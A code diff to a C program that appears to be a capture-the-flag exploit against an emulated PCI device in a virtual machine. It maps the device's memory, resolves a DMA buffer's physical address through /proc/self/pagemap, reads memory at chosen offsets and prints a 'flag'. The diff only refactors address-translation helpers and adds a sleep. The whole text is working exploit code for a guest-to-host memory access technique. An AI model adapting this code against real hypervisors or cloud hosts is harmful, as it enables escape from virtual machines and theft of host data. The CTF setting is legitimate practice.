@@ -133,24 +133,6 @@ struct MemoryRegionOps {
 
 int fd;
 
-uint32_t page_offset(uint32_t addr)
-{
-	    return addr & ((1 << PAGE_SHIFT) - 1);
-}
-
-uint64_t gva_to_gfn(void *addr)
-{
-        uint64_t pme, gfn;
-        size_t offset;
-        offset = ((uintptr_t)addr >> 9) & ~7;
-        lseek(fd, offset, SEEK_SET);
-        read(fd, &pme, 8);
-        if (!(pme & PFN_PRESENT))
-	        return -1;
-        gfn = pme & PFN_PFN;
-        return gfn;
-}
-
 uint64_t virt2phys(void* p)
 {
    uint64_t virt = (uint64_t)p;
@@ -204,13 +186,6 @@ uint64_t read_offt(uint64_t offt) {
 	return *(uint64_t* )dmabuf;
 }
 
-uint64_t gva_to_gpa(void *addr)
-{
-        uint64_t gfn = gva_to_gfn(addr);
-        assert(gfn != -1);
-        return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
-}
-
 int main() {
 	int fd1 = open(PATH, O_RDWR | O_SYNC);
 	if (-1 == fd1) {
@@ -221,12 +196,6 @@ int main() {
 	iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, 0); // map resource0
 	printf("iomem @ %p\n", iomem);
 
-        fd = open("/proc/self/pagemap", O_RDONLY);
-        if (fd < 0) {
-            perror("open");
-            exit(1);
-        }
-
 	dmabuf = malloc(0x1000);
 	memset(dmabuf, '\x00', sizeof(dmabuf));
 
@@ -235,7 +204,7 @@ int main() {
 	}
 
 	mlock(dmabuf, 0x1000); // trigger PAGE_FAULT to acually map the page
-	dmabuf_phys_addr = gva_to_gpa(dmabuf); // grap the physical address according to pagemap
+	dmabuf_phys_addr = virt2phys(dmabuf); // grab the physical address according to pagemap
         printf("DMA buffer (virt) @ %p\n", dmabuf);
 	printf("DMA buffer (phys) @ %p\n", (void*)dmabuf_phys_addr);
 
@@ -318,6 +287,8 @@ int main() {
 
 	memcpy(flag, dmabuf, 0x30);
 	printf("flag: %s\n", flag);
+	
+	sleep(20);
 
 	return 0;
 }
